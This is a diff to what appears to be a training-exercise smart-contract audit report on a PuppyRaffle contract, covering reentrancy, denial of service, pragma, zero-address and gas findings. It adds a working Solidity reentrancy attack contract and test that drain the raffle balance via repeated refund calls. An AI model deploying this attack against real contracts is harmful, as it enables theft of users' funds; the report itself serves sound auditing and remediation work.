@@ -1,4 +1,6 @@
-### [H-1] Reentrancy attack  in `PuppyRaffle::refund` allows entrant to darin raffle fund.
+<!-- @format -->
+
+### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to darin raffle fund.
 
 **Description** The `PuppyRaffle::refund` function doesnot allow CEI (Checks, effects and interaction) and as a result it drain the entire raffle funds.
 
@@ -24,7 +26,14 @@ In the `PuppyRaffle::refund` function , we make the external call to the `msg.se
 
 **Impact** An attacker can drain the entire raffle funds by calling the `PuppyRaffle::refund` function.
 
-**Proof of Concept** 
+**Proof of Concept**
+
+1. User enter raffle.
+2. Attacker setup the contract with a `fallback` function that calls the `refund` function.
+3. Attacker enter thr raffle
+4. Attacker calls the `refund` function from the attack contract and drain the raffle funds.
+
+`test_Rentrancy_refund` Code:
 
 ```javascript
 
@@ -58,27 +67,66 @@ function test_Rentrancy_refund() public {
         );
         console.log("ending contract balance", address(puppyRaffle).balance);
     }
-    
+
+```
+
+Attack Contract Code:
+
+```javascript
+
+    `contract` ReentranctyAttackContract {
+     PuppyRaffle puppyRaffle;
+      uint256 entranceFee;
+      uint256 attackeIndex;
+
+       constructor(PuppyRaffle _puppyRaffle) {
+         puppyRaffle = _puppyRaffle;
+         entranceFee = puppyRaffle.entranceFee();
+     }
+
+     function attack() external payable {
+            address[] memory players = new address[](1);
+            players[0] = address(this);
+            puppyRaffle.enterRaffle{value: entranceFee}(players);
+            attackeIndex = puppyRaffle.getActivePlayerIndex(address(this));
+         puppyRaffle.refund(attackeIndex);
+       }
+
+      function _stealMoney() internal {
+          if (address(puppyRaffle).balance >= entranceFee) {
+              puppyRaffle.refund(attackeIndex);
+           }
+       }
+
+       receive() external payable {
+           _stealMoney();
+       }
+
+      fallback() external payable {
+         _stealMoney();
+        }
+    }
+
 ```
 
 **Recommended Mitigation** The recommended mitigation is to follow the Checks-Effects-Interactions pattern. This means that all the checks should be done before any effects or interactions are made. In this case, the `players` array should be updated before making the external call to the `msg.sender` address.
 
-```javascript
-    function refund() external {
+```diff
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
         require(
-            block.timestamp > raffleEnd,
-            "PuppyRaffle: Raffle has not ended"
+            playerAddress == msg.sender,
+            "PuppyRaffle: Only the player can refund"
         );
         require(
-            !isRaffleEnded,
-            "PuppyRaffle: Raffle has already ended"
+            playerAddress != address(0),
+            "PuppyRaffle: Player already refunded, or is not active"
         );
-        isRaffleEnded = true;
-        address[] memory playersTemp = players;
-        players = new address[](0);
-        for (uint256 i = 0; i < playersTemp.length; i++) {
-            payable(playersTemp[i]).transfer(entranceFee);
-        }
++        players[playerIndex] = address(0);
++        emit RaffleRefunded(playerAddress);
+        payable(msg.sender).sendValue(entranceFee);
+-        players[playerIndex] = address(0);
+-        emit RaffleRefunded(playerAddress);
     }
 ```
 
@@ -102,12 +150,13 @@ function test_Rentrancy_refund() public {
 
 Anattacker might fill up the raffle array so big, that no one else enter, gurantee themself the win.
 
-**Proof of Concept** 
+**Proof of Concept**
 
 If we have 2 set of number of player enter in raffle the gas cost will be high for the 2set for the people.
+
 - 1st batch of gas used- 6252039
 - 2st batch of gas used- 18068129
-This is more than a 3x of the used from the 1st batch.
+  This is more than a 3x of the used from the 1st batch.
 
 ```javascript
  function test_breakingforDosc() external {
@@ -137,42 +186,40 @@ This is more than a 3x of the used from the 1st batch.
         console.log("gasUsed", gasUsedSecond);
         assert(gasUsedFirst < gasUsedSecond);
     }
- ```   
+```
+
  <br>
  
 **Recommended Mitigation** There are few recommendation.
     1. Consider the allowing then duplicate. User can make new wallwt address anyways to enter raffle, so duplicate check doesnt prevent the samw person from entering multiple time, only the same wallet address.
     2. Consider using mapping to check for duplicates. This would allow constant time loopup of wheather a user has already entered or not.
 
-
 ## L-2: Solidity pragma should be specific, not wide
 
 Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`
 
-
 - Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)
 
-	```solidity
-	pragma solidity ^0.7.6;
-	```
-
+  ```solidity
+  pragma solidity ^0.7.6;
+  ```
 
 ## I-1 Using older version is not recommended.
-Solc releases new version of compiler verison. USing older version prevent access to new solidity security checks. We also recommended using new version like `0.8.18`.
 
+Solc releases new version of compiler verison. USing older version prevent access to new solidity security checks. We also recommended using new version like `0.8.18`.
 
 # Gas
 
 ## [G-1] Unchanged state variable should be declared constant or immutablw.
 
 Reading from sttoragw is much more expensive than constant.
- 
+
 Instance :
+
 - `PupptRaffle::raffleDuration` should be `immutable`
 - `PuppyRaffle:commonIamgeURI` should be `constant`
 - `PuppyRaffle::rareImageUri` should be `constant`
 - `PuppyRaffle::legendaryImageUri` should be `constant`
-
 
 ### [G-2] Storage variable in a loop should be cached.
 
@@ -190,23 +237,20 @@ Everytime you use `players.length` you read from storage, as opposed to memory w
                 );
             }
         }
-```        
+```
 
 ## L-3: Missing checks for `address(0)` when assigning values to address state variables
 
 Check for `address(0)` when assigning values to address state variables.
 
-
-
 - Found in src/PuppyRaffle.sol [Line: 62](src/PuppyRaffle.sol#L62)
 
-	```solidity
-	        feeAddress = _feeAddress;
-	```
+  ```solidity
+          feeAddress = _feeAddress;
+  ```
 
 - Found in src/PuppyRaffle.sol [Line: 174](src/PuppyRaffle.sol#L174)
 
-	```solidity
-	        feeAddress = newFeeAddress;
-	```
-
+  ```solidity
+          feeAddress = newFeeAddress;
+  ```
